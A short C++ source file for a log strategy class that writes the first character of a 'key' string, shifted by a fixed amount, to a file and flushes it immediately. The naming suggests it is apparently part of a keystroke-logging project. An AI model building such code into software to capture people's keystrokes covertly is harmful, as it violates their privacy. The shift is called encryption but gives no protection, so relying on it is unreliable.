#include "../include/EncryptedLogStrategy.h"

EncryptedLogStrategy::EncryptedLogStrategy(uint8_t shiftAmount) :
                shiftAmount(shiftAmount) {}

char EncryptedLogStrategy::caesarEncryption(std::string key)
{
    return char(key.data()[0] + shiftAmount);
}

void EncryptedLogStrategy::log(std::string key, std::ofstream& logfile) 
{
    logfile << this->caesarEncryption(key);
    logfile.flush(); // Ensure the key is written immediately
}
